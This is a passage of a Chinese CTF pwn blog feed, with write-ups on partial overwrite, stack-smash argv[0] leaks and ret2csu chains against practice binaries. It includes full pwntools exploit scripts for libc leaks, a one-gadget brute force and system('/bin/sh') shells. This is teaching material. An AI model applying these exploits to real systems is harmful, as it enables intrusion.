class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>效果长这样<br><img src="/2019/08/16/overwrite/%E5%9B%BE%E7%89%875.png" alt></p><h1 id="gets"><a href="#gets" class="headerlink" title="gets"></a>gets</h1><p>这题没开pie，但它选择覆盖那里我还是挺懵的，就是两个真实地址，<strong>libc_start_main+192 和 _dl_init+139<br><img src="/2019/08/16/overwrite/%E5%9B%BE%E7%89%876.png" alt><br>我们到底选择覆盖哪个呢？这就很茫然了<br>Wiki上说的是：<br>我们一般要覆盖字节的话，至少要覆盖 1 个半字节才能够获取跳到 onegadget。然而，程序中读取的时候是 gets读取的，也就意味着字符串的末尾肯定会存在\x00。<br>而我们覆盖字节的时候必须覆盖整数倍个数，即至少会覆盖 3 个字节，而我们再来看看</strong>libc_start_main+240 的地址 0x7ffff7a2d830（我这里是800），如果覆盖 3 个字节，那么就是 0x7ffff700xxxx，已经小于了 libc 的基地址了，前面也没有刻意执行的代码位置。<br>一般来说 libc_start_main 在 libc 中的偏移不会差的太多，那么显然我们如果覆盖 __libc_start_main+240 ，显然是不可能的。<br>而 ld 的基地址呢？如果我们覆盖了栈上_dl_init+139，即为0x7ffff700xxxx。而观察上述的内存布局，我们可以发现libc位于 ld 的低地址方向，那么在随机化的时候，很有可能 libc 的第 3 个字节是为\x00 的。<br>举个例子，目前两者之间的偏移为<br>0x7ffff7dd7000-0x7ffff7a0d000=0x3ca000<br>那么如果 ld 被加载到了 0x7ffff73ca000，则显然 libc 的起始地址就是0x7ffff7000000。<br>然后就理所当然选_dl_init了（我觉得可能是libc是程序开始的地方，离我们要覆盖到的地址有点远，所以选一个近一点的）</p><p>所以由上面调试的截图可以看出，我们输完0x18个字符下一个ret处就是libc的地址了，而init离它还有18个偏移(a8-18=90—&gt;8个字节为一个偏移）</p><p><img src="/2019/08/16/overwrite/%E5%9B%BE%E7%89%877.png" alt><br>然后我们找一个能用的onegadget<br>我们写个payload看看可不可以跑（估计要跑个六七万次，太难了啊）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">common_gadget = 0x40059B</span><br><span class="line">def exp():</span><br><span class="line">    for i in range(0x100000):</span><br><span class="line">        # if args[&apos;REMOTE&apos;]:</span><br><span class="line">        #     p = remote(ip, port)</span><br><span class="line">        # else:</span><br><span class="line">        #     p = process(&apos;./gets&apos;)</span><br><span class="line">        # # gdb.attach(p)</span><br><span class="line">        p = process(&apos;./gets&apos;)</span><br><span class="line">        try:</span><br><span class="line">            payload = 0x18 * &apos;a&apos; + p64(common_gadget)</span><br><span class="line">            for _ in range(2):</span><br><span class="line">                payload += &apos;a&apos; * 0x28 + p64(common_gadget)</span><br><span class="line">            payload += &apos;a&apos; * 0x28 + &apos;\x16\02&apos;</span><br><span class="line">            p.sendline(payload)</span><br><span class="line"></span><br><span class="line">            p.sendline(&apos;ls&apos;)</span><br><span class="line">            data = p.recv()</span><br><span class="line">            print data</span><br><span class="line">            p.interactive()</span><br><span class="line">            p.close()</span><br><span class="line">        except Exception:</span><br><span class="line">            p.close()</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><p>之前偶然跑出来一次，然后再没跑出来了……先放个exp，改天再试试</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;partial-overwrite&quot;&gt;&lt;a href=&quot;#partial-overwrite&quot; class=&quot;headerlink&quot; title=&quot;partial overwrite&quot;&gt;&lt;/a&gt;partial overwrite&lt;/h2&gt;&lt;p&gt;我们知道, 在开启了随机化（ASLR，PIE）后, 无论高位的地址如何变化，低 12 位的页内偏移始终是固定的, 也就是说如果我们能更改低位的偏移, 就可以在一定程度上控制程序的执行流, 绕过 PIE 保护。&lt;br&gt;（对于绕过PIE的操作我是没怎么接触过的）&lt;br&gt;大概就是用字节覆盖修改地址，使程序跳转到我们想用的函数上去&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>ssp操作</title>
    <link href="http://yoursite.com/2019/08/16/ssp/"/>
    <id>http://yoursite.com/2019/08/16/ssp/</id>
    <published>2019-08-16T03:39:15.000Z</published>
    <updated>2019-09-02T16:12:10.000Z</updated>
    
    <content type="html"><![CDATA[<p>用于开了canary的程序（无法正常爆破canary）就借助这种操作，打印出栈内的字符串<br>就是通过栈溢出报错信息，泄漏出指定地址的方法：<br>　　stack smashing detected:+argv[0]<br>如果我们覆盖argv[0]，便会输出特定字符串</p><a id="more"></a><p>满足条件为<br>1、开了canary<br>2、Flag在程序内</p><p>看wiki里的花式栈溢出的时候看到的题（其实我很迷为啥把它放到花式栈溢出里，之后再细细研究吧）</p><p>关于stack smash</p><p>这个有点开拓我知识面了，对于canary我一直很迷，看到这里才知道canary操作起来是个啥样子的。<br>Wiki原话：</p><p>在程序启动 canary 保护之后，如果发现 canary 被修改的话，程序就会执行?__stack_chk_fail?函数来打印 argv[0] 指针所指向的字符串，正常情况下，这个指针指向了程序名。<br>代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">void __attribute__ ((noreturn)) __stack_chk_fail (void)&#123;</span><br><span class="line">  __fortify_fail (&quot;stack smashing detected&quot;);&#125;void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)&#123;</span><br><span class="line">  /* The loop is added only to keep gcc happy.  */</span><br><span class="line">  while (1)</span><br><span class="line">    __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,</span><br><span class="line">                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);&#125;</span><br></pre></td></tr></table></figure><p>所以说如果我们利用栈溢出覆盖 argv[0] 为我们想要输出的字符串的地址，那么在?__fortify_fail?函数中就会输出我们想要的信息</p><h2 id="smashes"><a href="#smashes" class="headerlink" title="smashes"></a>smashes</h2><p>所以我们要找argv[0]的地址，（因为我们要求的偏移就是argv[0] 距离读取的字符串的偏移）</p><p><img src="/2019/08/16/ssp/%E5%9B%BE%E7%89%871.png" alt></p><p>程序名指向的地址为e159，但是dd98里存放的是指向程序名的地址，所以我们需要的地址为后者<br>接着在输入的地方下个断点，找上一个rsp作为字符串开始的地址</p><p><img src="/2019/08/16/ssp/%E5%9B%BE%E7%89%872.png" alt></p><p>然后我们就可以算偏移了</p><p><img src="/2019/08/16/ssp/%E5%9B%BE%E7%89%873.png" alt></p><p>所以我们的偏移为0x218</p><p>看程序会发现在一个地方会有flag的输出</p><p><img src="/2019/08/16/ssp/%E5%9B%BE%E7%89%874.png" alt></p><p>但是我们看不到flag是什么<br>最无奈的是我们输入的内容会覆盖整个地址，所以我们没有办法直接读出<br>我们只能去找另一处的flag地址，这就接触到里另一个新的知识点了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在 ELF 内存映射时，bss 段会被映射两次，所以我们可以使用另一处的地址来进行输出，可以使用 gdb 的 find 来进行查找（pwndbg的话就用search吧）</span><br></pre></td></tr></table></figure><p><img src="/2019/08/16/ssp/%E5%9B%BE%E7%89%875.png" alt></p><p>现在就可以写exp了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># p = process(&apos;./smashes&apos;)</span><br><span class="line">p = remote(&apos;pwn.jarvisoj.com&apos;, 9877)</span><br><span class="line"></span><br><span class="line">flag = 0x0400D20</span><br><span class="line"></span><br><span class="line">payload = &quot;a&quot;*0x218 + p64(flag)</span><br><span class="line">p.recvuntil(&apos;name? &apos;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&apos;flag: &apos;)</span><br><span class="line">p.sendline(&apos;CTF&apos;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这里很坑的就是我找flag是按照程序里给的格式找的，是CTF开头的，但是真正的flag是PCTF（0x600d20那个位置的0x50转字符就是P），所以它的地址得再往前拨一位</p><p><img src="/2019/08/16/ssp/%E5%9B%BE%E7%89%876.png" alt></p><h2 id="GUESS"><a href="#GUESS" class="headerlink" title="GUESS"></a>GUESS</h2><p>再来做道GUESS<br>这题有三次的输入，我们可以通过三次输入实现我们的leak和读取flag，这题和上面那题的思路大概是一致的，都是读取栈上的字符串，而不需要getshell（上面那题是可以知道flag具体存在哪里了，这题需要libc找）</p><p>本题思路：</p><p>1.泄漏libc的基址<br>2.泄漏environ的地址（也就是栈的地址）<br>3.泄漏flag</p><p>三次泄漏都用到了上一题说的ssp，就是通过栈溢出报错信息，泄漏出指定地址的方法：stack smashing detected:+argv[0]<br>如果我们覆盖argv[0]，便会输出特定字符串</p><p>对environ很迷的我看了一下23R3F大佬的wp，又发现了新的玩意儿(以下来自大佬博客<a href="https://www.jianshu.com/p/cc9d09a3f65f)：" target="_blank" rel="noopener">https://www.jianshu.com/p/cc9d09a3f65f)：</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在linux应用程序运行时，内存的最高端是环境/参数节（environment/arguments?section）</span><br><span class="line">用来存储系统环境变量的一份复制文件，进程在运行时可能需要。</span><br><span class="line">例如，运行中的进程，可以通过环境变量来访问路径、shell?名称、主机名等信息。</span><br><span class="line">该节是可写的，因此在格式串（format?string）和缓冲区溢出（buffer?overflow）攻击中都可以攻击该节。</span><br><span class="line">*environ指针指向栈地址(环境变量位置)，有时它也成为攻击的对象，泄露栈地址，篡改栈空间地址，进而劫持控制流。</span><br></pre></td></tr></table></figure><p>好，我们按照刚刚那题的解题步骤，先找argv[0]和字符串开始的地方来计算偏移</p><p><img src="/2019/08/16/ssp/%E5%9B%BE%E7%89%877.png" alt></p><p><img src="/2019/08/16/ssp/%E5%9B%BE%E7%89%878.png" alt></p><p><img src="/2019/08/16/ssp/%E5%9B%BE%E7%89%879.png" alt></p><p>算出偏移我们就可以按照思路来写exp了<br>前面两个part如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./GUESS&apos;)</span><br><span class="line">elf = ELF(&apos;./GUESS&apos;)</span><br><span class="line">libc = ELF(&apos;./libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[&apos;puts&apos;]</span><br><span class="line"></span><br><span class="line"># open_flag = 0x400A9A</span><br><span class="line"># argv = 0x7fffffffdda8</span><br><span class="line"># rsi_addr = 0x7fffffffdc80</span><br><span class="line"># distance = 0x128</span><br><span class="line"></span><br><span class="line">payload = &quot;a&quot;*0x128 + p64(puts_got)</span><br><span class="line">p.sendline(payload) </span><br><span class="line">p.recvuntil(&apos;stack smashing detected ***: &apos;) </span><br><span class="line">puts_addr = u64(p.recvuntil(&apos; &apos;)[:-1]+&apos;\x00\x00&apos;) </span><br><span class="line"># puts_addr = u64(p.recvuntil(&apos; &apos;)[:-1]) </span><br><span class="line">print &quot;puts_addr:&quot;+hex(puts_addr)</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.symbols[&apos;puts&apos;] </span><br><span class="line">environ_addr = libc_base + libc.symbols[&apos;_environ&apos;] </span><br><span class="line">print &quot;libc_base:&quot;+hex(libc_base) </span><br><span class="line">print &quot;environ:&quot;+hex(environ_addr)</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x128 + p64(environ_addr) </span><br><span class="line">p.sendline(payload) </span><br><span class="line">p.recvuntil(&apos;stack smashing detected ***: &apos;) </span><br><span class="line">stack_addr = u64(p.recvuntil(&apos; &apos;)[:-1]+&apos;\x00\x00&apos;) </span><br><span class="line"># stack_addr = u64(p.recvuntil(&apos; &apos;)[:-1]) </span><br><span class="line">print &quot;stack_addr:&quot;+hex(stack_addr)</span><br></pre></td></tr></table></figure><p>然后我们要算出buf与environ的差值，使程序跳转到flag的位置</p><p><img src="/2019/08/16/ssp/%E5%9B%BE%E7%89%8710.png" alt></p><p>构造最后一步的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;a&apos;*0x128 + p64(stack_addr-0x168)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure><p>最后效果</p><p><img src="/2019/08/16/ssp/%E5%9B%BE%E7%89%8711.png" alt></p><p>其实还是挺迷的，以后碰到题可能还会懵，先记录着吧</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;用于开了canary的程序（无法正常爆破canary）就借助这种操作，打印出栈内的字符串&lt;br&gt;就是通过栈溢出报错信息，泄漏出指定地址的方法：&lt;br&gt;　　stack smashing detected:+argv[0]&lt;br&gt;如果我们覆盖argv[0]，便会输出特定字符串&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>libc_csu</title>
    <link href="http://yoursite.com/2019/07/08/libc-csu/"/>
    <id>http://yoursite.com/2019/07/08/libc-csu/</id>
    <published>2019-07-08T15:15:17.000Z</published>
    <updated>2019-07-08T15:46:46.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="libc-csu"><a href="#libc-csu" class="headerlink" title="_libc_csu"></a><em>_libc_csu</em></h2><p>1、Ret2csu</p><p>这是一个64位的题，开了NX，照常，进ida里瞄瞄它的大体结构是怎样的。<br>Emmm真是一个异常简洁的main函数</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%871.png" alt></p><p>我们发现它有个pwnme函数哦，那就点进去看一下</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%872.png" alt></p><p>它里面说了ret2win 的第三个参数（rdx）必须为“0xdeadcafebabebeef”，异或出来是“/bin/cat”，先记住它。然后它还有一堆的赋值为0的语句，手欠点开来看，发现它把got表全置0了，那么我们就完全不用考虑got表。</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%873.png" alt></p><a id="more"></a><p>然后我们会看到还有一个ret2win函数</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%874.png" alt></p><p>看到system就知道我们的getshell的关键步骤就在这里了，最后就是要把地址指向ret2win这个函数的，所以下一步就是要去找gadget。</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%875.png" alt></p><p>我们知道ret2win的第三个参数是与rdx有关的，但是我们找不到关于rdx的gadget，所以只能另辟他径。<br>ret2csu这类题目貌似就是通过__libc_csu_init函数的操作（很多gadget的函数）</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%876.png" alt></p><p>由函数体关系得知<br>rbx=0<br>rbp=1（rbp=rbx+1）<br>r12：存调用函数的地址<br>r13：函数的第一个参数<br>r14：函数的第二个参数<br>r15：函数的第三个参数（a3/rdx）</p><p>然后还有一个很严重的问题，有一个setvbuf函数，据大佬所说是会把rdx的值赋值为0xfffffff，然后无法调用ret2win，所以导致在call处程序出错，无法再执行下去（但是我是在是调不到setvbuf那个函数的地方，下断点也没找到那个赋值语句）然后只能选用一个程序的初始化用的函数地址，</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%877.png" alt></p><p>就这两个函数的地址，用这两个函数写入r12里，躲过setvbuf，然后就可以getshell了。</p><p>rdx是由r15传值得到的，而刚好下面的一系列操作包括r15的，所以这些gadget可用，上面的函数有个跳转指令，为了使他不跳转，我们可以直接对rbx和rbp赋值，rbx为0，rbp为1。我们先pop这些寄存器，并且赋值，再进入mov，最后在call的地方调用ret2win，所以r12存的应该是ret2win的地址。<br>理清得差不多了，就开始写exp了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">sh = process(<span class="string">'./ret2csu'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#bss = 0x0601060</span></span><br><span class="line">start = 0x0400880<span class="comment">#mov rdx, r15;mov  rsi, r14;mov  edi, r13d;call  qword ptr [r12+rbx*8]</span></span><br><span class="line">end = 0x0400896<span class="comment">#add  rsp, 8;pop  rbx;pop  rbp;pop  r12/r13/r14/r15</span></span><br><span class="line">init = 0x0600E10</span><br><span class="line">win = 0x04007B1</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*0x20+p64(0)</span><br><span class="line">payload += p64(end)</span><br><span class="line">payload += p64(0)</span><br><span class="line">payload += p64(0)<span class="comment">#rbx</span></span><br><span class="line">payload += p64(1)<span class="comment">#rbp</span></span><br><span class="line">payload += p64(init)<span class="comment">#r12</span></span><br><span class="line">payload += p64(0)<span class="comment">#r13</span></span><br><span class="line">payload += p64(0)<span class="comment">#r14</span></span><br><span class="line">payload += p64(0xdeadcafebabebeef)<span class="comment">#r15(rdx)</span></span><br><span class="line">payload += p64(start)</span><br><span class="line">payload += <span class="string">"a"</span>*56</span><br><span class="line">payload += p64(win)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>运行之后就拿到flag了</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%878.png" alt></p><h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><p>Ida里打开main函数</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%879.png" alt><br><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%8710.png" alt></p><p>发现这个程序调用了write和read两个函数。<br>没有system没有“/bin/sh”<br>看到了熟悉的gadget</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%8711.png" alt></p><p>再看看在write和read里面，参数分别是存入哪些寄存器</p><p>Write<br><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%8712.png" alt></p><p>Read<br><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%8713.png" alt></p><p>易知第三个参数存入edx（rdx），第二个是esi（rsi），第三个是edi（rdi）<br>在上面的万用gadget里我们知道rdx的值来自于r13，rsi来自于r14，edi来自于r15d</p><p>我们要做的是<br>（1）、先调用write函数把read/write函数的真实地址泄露出来（运行程序的时候这两个函数被调用了）找到system或者execve的真实地址<br>（2）、用read函数，把system（“/bin/sh”）写进bss段里(system在bss里，即bss_addr，”/bin/sh”在bss的下一个地址,即bss_addr+8<br>（3）、调用system函数达成getshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./level5"</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level5'</span>)</span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line"><span class="comment">#bss_base = elf.bss()</span></span><br><span class="line">bss_addr = 0x0601040</span><br><span class="line"></span><br><span class="line">start_addr = 0x0400600  <span class="comment">#add rsp, 8 pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">end_addr = 0x040061A  <span class="comment">#mov rdx,13 rsi,r14 eid,r15 call</span></span><br><span class="line">_start = elf.symbols[<span class="string">'_start'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def csu(rbx,rbp,r12,r13,r14,r15,_start):</span><br><span class="line">payload = <span class="string">"a"</span>*0x80 +p64(0)</span><br><span class="line">payload += p64(end_addr)+p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)</span><br><span class="line">payload += p64(start_addr)+<span class="string">"a"</span>*0x38</span><br><span class="line">payload += p64(_start)</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Hello, World\n'</span>)</span><br><span class="line"></span><br><span class="line">csu(0,1,write_got,8,write_got,1,_start)</span><br><span class="line"></span><br><span class="line">write_addr = u64(p.recv(8))</span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>,write_addr)</span><br><span class="line">offest = write_addr-libc.dump(<span class="string">'write'</span>)</span><br><span class="line">system_addr = libc.dump(<span class="string">'system'</span>)+offest</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)</span><br><span class="line"></span><br><span class="line">csu(0,1,read_got,16,bss_addr,0,_start)</span><br><span class="line"></span><br><span class="line">p.send(p64(system_addr)+<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)</span><br><span class="line"></span><br><span class="line">csu(0,1,bss_addr,0,0,bss_addr+8,_start)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行结果<br><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%8714.png" alt></p><h2 id="OJ-level5"><a href="#OJ-level5" class="headerlink" title="OJ level5"></a>OJ level5</h2><p>题目说假设system和execve被禁用，用mmap和mprotect实现getshell。<br>所以我们需要自己将shellcode写进bss段里。</p><p>科普一下mmap和mprotect</p><p>我们通过函数mmap来告诉操作系统把哪个文件映射哪块内存去，并且设置我们可能对这块内存的不能操作，就是对文件一样。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;sys/mman.h&gt;</span></span><br><span class="line">void* mmap(void* addr, size_t len, int port, int flag, int filedes, off_t off)</span><br><span class="line"></span><br><span class="line">返回值：成功返回被映射的内存地址，失败返回MAP_FIALED</span><br></pre></td></tr></table></figure><p>参数 addr<br>这个只有在极少数情况下才不为0，这个参数告诉内核使用addr指定的值来映射指定文件。当指定为0的时候，告诉内核返回什么地址内其自身决定。除非非常了解系统进程模式，或者对当前环境非常了解，否则的话手工指定这个值总是不可取。<br>参数 len<br>指定被映射的内存区域的长度。<br>参数 port<br>这个参数对应open函数的权限位，我们可以指定为：PROT_READ，映射区可读；PROT_WRITE，映射区可写；PROT_EXEC，映射区可执行；PROT_NONE，映射区不可访问。由于只能映射已经打开的文件，所以这个权限位不能超出open函数指定的权限，比如说在open的时候指定为只读，那就不能在此时指定PORT_WRITE。<br>参数 flag<br>这个参数指定了映射区的其它一些属性，权限的属性已经在port中指定。这里可能存在的典型值有：MAP_FIXED，针对addr属性，如果指定这个位，那么要求系统必需在指定的地址映射，这往往是不可取的；MAP_SHARED，此标志说明指定映射区是共享的，意思就是说对内存的操作与对文件的操作是相对应的，它不能与MAP_PRIVATE标志一直使用，因为它们表达的意图是相反的；MAP_PRIVATE，该标志说明映射区是私用的，此时被映射的内存只能被当前里程使用，当进程操作的内存将会产生原文件的一个副本。</p><p>mprotect 函数可以更改一个已经存在的映射区的访问权限。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;sys/mman.h&gt;</span></span><br><span class="line">int mprotect(void* addr, size_t len, int port)</span><br><span class="line"></span><br><span class="line">返回值：成功返回0，失败返回-1</span><br></pre></td></tr></table></figure><p>参数 addr<br>这个参数是mmap返回的数值，此时它就是mprotect作用的范围。<br>参数 len<br>指定映射区的长度，它需要与mmap中指定相同。<br>参数 port<br>在上面我们已经介绍了port的可能取值，mprotect功能就是把这个port指定的属性施加于相应的映射区上。</p><p>好，我们来看题</p><p>开了NX<br>既然题目有提示一个更改权限的函数，那我们就去看一下bss段的权限，应该是禁止执行了的</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%8715.png" alt></p><p>readelf -S先找到bss的地址</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%8716.png" alt></p><p>vmmap查看权限，bss段的地址为0x600a88 ，在0x600000-0x601000之间，不可执行</p><p>思路：<br>（1）先通过write函数leak出write（也可以是其他）的真实地址<br>（2）找到mprotect的真实地址<br>（3）将shellcode写入bss段<br>（4）调用mprotect将bss段权限更改<br>（5）调用bss，getshell</p><p>第一段的代码：（leak write_addr，found mprotect_addr）</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%8717.png" alt></p><p>第二段（shellcode写入bss）</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%8718.png" alt></p><p>第三段（找两个空的got地址，将mprotect和bss写入方便调用）</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%8719.png" alt></p><p>最后就直接通过csu调用bss段就可以getshell了，（很奇怪的是本地get不到，远程可以）</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%8720.png" alt></p><h1 id="两种方法的exp"><a href="#两种方法的exp" class="headerlink" title="两种方法的exp"></a>两种方法的exp</h1><p>第一种（写个函数，直接调用）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 